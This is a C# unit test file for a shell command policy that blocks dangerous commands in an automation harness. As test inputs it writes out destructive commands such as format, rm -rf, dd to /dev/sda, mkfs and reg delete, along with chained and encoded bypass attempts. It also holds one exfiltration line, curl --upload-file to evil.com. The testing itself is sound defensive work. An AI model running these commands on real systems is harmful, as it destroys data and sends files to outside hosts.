using SystemHarness.Windows;

namespace SystemHarness.Tests.Shell;

[Trait("Category", "CI")]
public class CommandPolicyTests
{
    [Fact]
    public void DefaultPolicy_BlocksFormat()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("format", "C: /FS:NTFS", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DefaultPolicy_BlocksShutdown()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("shutdown", "/s /t 0", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksRmRf()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("rm -rf /tmp/important", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DefaultPolicy_BlocksDelRecursive()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("del /S C:\\temp\\*", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksRegDelete()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("reg delete HKCU\\Software\\Test /f", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksDiskpart()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("diskpart", "/s script.txt", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public async Task DefaultPolicy_AllowsSafeCommands()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var result = await shell.RunAsync("cmd", "/C echo hello", ct: TestContext.Current.CancellationToken);
        Assert.True(result.Success);
        Assert.Contains("hello", result.StdOut);
    }

    [Fact]
    public async Task DefaultPolicy_AllowsDir()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var result = await shell.RunAsync("dir", ct: TestContext.Current.CancellationToken);
        Assert.True(result.Success);
    }

    [Fact]
    public void CustomPolicy_BlocksCustomPattern()
    {
        var policy = new CommandPolicy()
            .BlockPattern(@"curl\s+.*--upload");

        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("curl --upload-file data.txt http://evil.com", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public void CustomPolicy_BlocksCustomProgram()
    {
        var policy = new CommandPolicy()
            .BlockProgram("notepad");

        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("notepad.exe", "test.txt", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Fact]
    public void EmptyPolicy_AllowsEverything()
    {
        var policy = new CommandPolicy();
        // No violation for any command
        Assert.Null(typeof(CommandPolicy)
            .GetMethod("CheckViolation", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!
            .Invoke(policy, ["format", "C:"]));
    }

    [Fact]
    public void ExceptionContainsBlockedCommand()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("shutdown", "/s /t 0", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Equal("shutdown /s /t 0", ex.BlockedCommand);
    }

    // --- Edge case tests (cycle 227) ---

    [Fact]
    public void FullPath_ProgramBlocked_AfterNormalization()
    {
        var policy = CommandPolicy.CreateDefault();
        // Path.GetFileNameWithoutExtension("C:\\Windows\\System32\\format.exe") → "format"
        var result = CheckViolation(policy, @"C:\Windows\System32\format.exe", "D:");
        Assert.NotNull(result);
        Assert.Contains("format", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CaseInsensitive_ProgramBlocked()
    {
        var policy = CommandPolicy.CreateDefault();
        // HashSet uses OrdinalIgnoreCase — "FORMAT" should match "format"
        var result = CheckViolation(policy, "FORMAT", "C:");
        Assert.NotNull(result);
    }

    [Fact]
    public void FluentChaining_BothBlocksWork()
    {
        var policy = new CommandPolicy()
            .BlockProgram("dangerous")
            .BlockPattern(@"--force-delete");

        Assert.NotNull(CheckViolation(policy, "dangerous", ""));
        Assert.NotNull(CheckViolation(policy, "cleanup", "--force-delete all"));
        Assert.Null(CheckViolation(policy, "safe-tool", "--verbose"));
    }

    [Fact]
    public void DefaultPolicy_BlocksReboot()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "reboot", ""));
    }

    [Fact]
    public void DefaultPolicy_BlocksFdisk()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "fdisk", "/dev/sda"));
    }

    [Fact]
    public void DefaultPolicy_BlocksRdRecursive()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "cmd", "/C rd /s /q C:\\important"));
    }

    [Fact]
    public void DefaultPolicy_BlocksDdToDevice()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "dd", "if=/dev/zero of=/dev/sda bs=1M"));
    }

    [Fact]
    public void DefaultPolicy_BlocksMkfsPattern()
    {
        var policy = CommandPolicy.CreateDefault();
        // Blocked both as program ("mkfs") and as pattern ("mkfs.")
        Assert.NotNull(CheckViolation(policy, "mkfs", ""));
        Assert.NotNull(CheckViolation(policy, "bash", "-c mkfs.ext4 /dev/sda1"));
    }

    [Fact]
    public void DefaultPolicy_BlocksRawDiskWrite()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "echo", "data > /dev/sdb"));
    }

    [Fact]
    public void CheckViolation_AllowedCommand_ReturnsNull()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.Null(CheckViolation(policy, "cmd", "/C echo hello"));
        Assert.Null(CheckViolation(policy, "dir", ""));
        Assert.Null(CheckViolation(policy, "git", "status"));
    }

    [Fact]
    public void CheckViolation_BlockedProgram_MessageContainsProgramName()
    {
        var policy = CommandPolicy.CreateDefault();
        var result = CheckViolation(policy, "shutdown", "/s");
        Assert.NotNull(result);
        Assert.Contains("shutdown", result);
        Assert.Contains("blocked", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CheckViolation_BlockedPattern_MessageContainsPattern()
    {
        var policy = CommandPolicy.CreateDefault();
        var result = CheckViolation(policy, "reg", "delete HKLM\\Software\\Test");
        Assert.NotNull(result);
        Assert.Contains("pattern", result, StringComparison.OrdinalIgnoreCase);
    }

    // --- PolicyEnforcingShell edge cases (cycle 229) ---

    [Fact]
    public void PolicyEnforcingShell_NullInner_Throws()
    {
        Assert.Throws<ArgumentNullException>(
            () => new PolicyEnforcingShell(null!, CommandPolicy.CreateDefault()));
    }

    [Fact]
    public void PolicyEnforcingShell_NullPolicy_Throws()
    {
        Assert.Throws<ArgumentNullException>(
            () => new PolicyEnforcingShell(new WindowsShell(), null!));
    }

    [Fact]
    public void PolicyEnforcingShell_SingleArgRunAsync_WrapsAsCmd()
    {
        // Single-arg RunAsync wraps as "cmd.exe /C {command}" for pattern checking
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        // "reg delete" should be caught by pattern even via single-arg overload
        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("reg delete HKCU\\Test /f", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Equal("reg delete HKCU\\Test /f", ex.BlockedCommand);
    }

    [Fact]
    public void CommandPolicyException_InheritsFromHarnessException()
    {
        var ex = new CommandPolicyException("test");
        Assert.IsAssignableFrom<HarnessException>(ex);
        Assert.IsAssignableFrom<Exception>(ex);
    }

    [Fact]
    public void CommandPolicyException_BlockedCommand_NullByDefault()
    {
        var ex = new CommandPolicyException("some violation");
        Assert.Null(ex.BlockedCommand);
        Assert.Equal("some violation", ex.Message);
    }

    [Fact]
    public void HarnessException_InnerException_Preserved()
    {
        var inner = new InvalidOperationException("root cause");
        var ex = new HarnessException("wrapper", inner);
        Assert.Equal("wrapper", ex.Message);
        Assert.Same(inner, ex.InnerException);
    }

    // --- 1-arg RunAsync BlockProgram bypass tests ---

    [Theory]
    [InlineData("format C:")]
    [InlineData("format C: /FS:NTFS")]
    [InlineData("shutdown /s /t 0")]
    [InlineData("diskpart /s script.txt")]
    [InlineData("reboot")]
    [InlineData("mkfs /dev/sda1")]
    [InlineData("fdisk /dev/sda")]
    public void SingleArgRunAsync_BlockedProgram_IsBlocked(string command)
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync(command, ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Equal(command, ex.BlockedCommand);
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SingleArgRunAsync_CustomBlockedProgram_IsBlocked()
    {
        var policy = new CommandPolicy().BlockProgram("mytool");
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("mytool --dangerous-flag", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Equal("mytool --dangerous-flag", ex.BlockedCommand);
    }

    [Fact]
    public void SingleArgRunAsync_BlockedPattern_StillWorks()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        // Pattern-based blocks should still work via the cmd.exe /C fallback
        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("del /S C:\\temp\\*", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
        Assert.Contains("pattern", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DefaultPolicy_BlocksAProgramChainedAfterAnAllowedOne()
    {
        var shell = new PolicyEnforcingShell(new WindowsShell(), CommandPolicy.CreateDefault());

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("dir & shutdown /s /t 0", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
    }

    [Theory]
    [InlineData("shutdown", "/s /t 0")]
    [InlineData(@"C:\Windows\System32\shutdown.exe", "/r")]
    [InlineData("cmd.exe", "/c shutdown /s")]
    [InlineData("powershell", "-Command \"format D:\"")]
    public async Task ProcessStart_BlockedProgram_IsRefusedBeforeStarting(string path, string arguments)
    {
        var inner = new RecordingProcessManager();
        var processes = new PolicyEnforcingProcessManager(inner, CommandPolicy.CreateDefault());

        await Assert.ThrowsAsync<CommandPolicyException>(
            () => processes.StartAsync(path, arguments, TestContext.Current.CancellationToken));
        await Assert.ThrowsAsync<CommandPolicyException>(
            () => processes.StartAsync(path, new ProcessStartOptions { Arguments = arguments }, TestContext.Current.CancellationToken));
        Assert.Equal(0, inner.Starts);
    }

    [Theory]
    [InlineData("notepad.exe", "notes.txt")]
    [InlineData("cmd.exe", "/c dir /s")]
    [InlineData("git", "log --format=%H")]
    public async Task ProcessStart_AllowedProgram_Starts(string path, string arguments)
    {
        var inner = new RecordingProcessManager();
        var processes = new PolicyEnforcingProcessManager(inner, CommandPolicy.CreateDefault());

        await processes.StartAsync(path, arguments, TestContext.Current.CancellationToken);

        Assert.Equal(1, inner.Starts);
    }

    [Fact]
    public void WindowsHarness_WithPolicy_GuardsProcessStarts()
    {
        using var harness = new WindowsHarness(new HarnessOptions { CommandPolicy = CommandPolicy.CreateDefault() });

        Assert.IsType<PolicyEnforcingProcessManager>(harness.Process);
    }

    private sealed class RecordingProcessManager : IProcessManager
    {
        public int Starts { get; private set; }

        public Task<ProcessInfo> StartAsync(string path, string? arguments = null, CancellationToken ct = default)
        {
            Starts++;
            return Task.FromResult(new ProcessInfo { Pid = 1, Name = path });
        }

        public Task<ProcessInfo> StartAsync(string path, ProcessStartOptions options, CancellationToken ct = default)
            => StartAsync(path, options.Arguments, ct);

        public Task KillAsync(int pid, CancellationToken ct = default) => Task.CompletedTask;
        public Task KillByNameAsync(string name, CancellationToken ct = default) => Task.CompletedTask;
        public Task<IReadOnlyList<ProcessInfo>> ListAsync(string? filter = null, CancellationToken ct = default)
            => Task.FromResult<IReadOnlyList<ProcessInfo>>([]);
        public Task<bool> IsRunningAsync(string name, CancellationToken ct = default) => Task.FromResult(false);
    }

    // A shell host's command part is checked; what it hands to a script is the script's data
    [Theory]
    [InlineData("pwsh", "-File \"/plugins/p/run.ps1\" format shutdown")]
    [InlineData("pwsh", "-NoProfile -ExecutionPolicy Bypass -File run.ps1 format")]
    [InlineData("pwsh", "-f run.ps1 shutdown")]
    [InlineData("pwsh", "run.ps1 format")]
    [InlineData("powershell", "-File C:\\plugins\\run.ps1 shutdown")]
    [InlineData("powershell", "run.ps1 format")]
    [InlineData("bash", "run.sh format shutdown")]
    [InlineData("sh", "-e ./run.sh shutdown")]
    [InlineData("bash", "-o pipefail run.sh format")]
    public void ShellHost_ScriptArguments_AreData(string host, string arguments) =>
        Assert.Null(CheckViolation(CommandPolicy.CreateDefault(), host, arguments));

    [Theory]
    [InlineData("pwsh", "-Command \"format\"")]
    [InlineData("pwsh", "-NoProfile -c \"Get-Date; shutdown /s\"")]
    [InlineData("powershell", "Get-ChildItem; shutdown /s")]
    [InlineData("pwsh", "-ExecutionPolicy Bypass -Command shutdown")]
    [InlineData("cmd", "/c echo hi & format C:")]
    [InlineData("cmd", "/C run.cmd shutdown")]
    [InlineData("bash", "-c \"ls; shutdown now\"")]
    [InlineData("bash", "-o pipefail -c \"shutdown now\"")]
    [InlineData("sh", "-lc reboot")]
    [InlineData("wsl", "shutdown now")]
    public void ShellHost_CommandPart_IsChecked(string host, string arguments) =>
        Assert.NotNull(CheckViolation(CommandPolicy.CreateDefault(), host, arguments));

    [Fact]
    public void ShellHost_EncodedCommand_IsDecodedAndChecked()
    {
        var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Get-Date; shutdown /s"));

        Assert.NotNull(CheckViolation(CommandPolicy.CreateDefault(), "pwsh", $"-NoProfile -EncodedCommand {encoded}"));
        Assert.NotNull(CheckViolation(CommandPolicy.CreateDefault(), "powershell", $"-ec {encoded}"));
    }

    // The reporter's repro through the enforcing shell: the script run reaches the inner shell, the command run does not
    [Fact]
    public async Task PolicyShell_RunsAScriptWithDataArguments_AndRefusesTheSameWordAsACommand()
    {
        var inner = new RecordingShell();
        var shell = new PolicyEnforcingShell(inner, CommandPolicy.CreateDefault());
        var ct = TestContext.Current.CancellationToken;

        await shell.RunAsync("pwsh", "-File run.ps1 format", ct: ct);
        await Assert.ThrowsAsync<CommandPolicyException>(() => shell.RunAsync("pwsh", "-Command \"format\"", ct: ct));
        await Assert.ThrowsAsync<CommandPolicyException>(() => shell.RunAsync("cmd", "/c echo hi & format", ct: ct));

        Assert.Equal(1, inner.Runs);
    }

    private sealed class RecordingShell : IShell
    {
        public int Runs { get; private set; }

        public Task<ShellResult> RunAsync(string command, ShellOptions? options = null, CancellationToken ct = default) =>
            throw new NotSupportedException("the facts here run a program with arguments");

        public Task<ShellResult> RunAsync(string program, string arguments, ShellOptions? options = null, CancellationToken ct = default)
        {
            Runs++;
            return Task.FromResult(new ShellResult { ExitCode = 0, StdOut = string.Empty, StdErr = string.Empty, Elapsed = TimeSpan.Zero });
        }
    }

    private static string? CheckViolation(CommandPolicy policy, string program, string arguments)
    {
        return (string?)typeof(CommandPolicy)
            .GetMethod("CheckViolation", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!
            .Invoke(policy, [program, arguments]);
    }
}
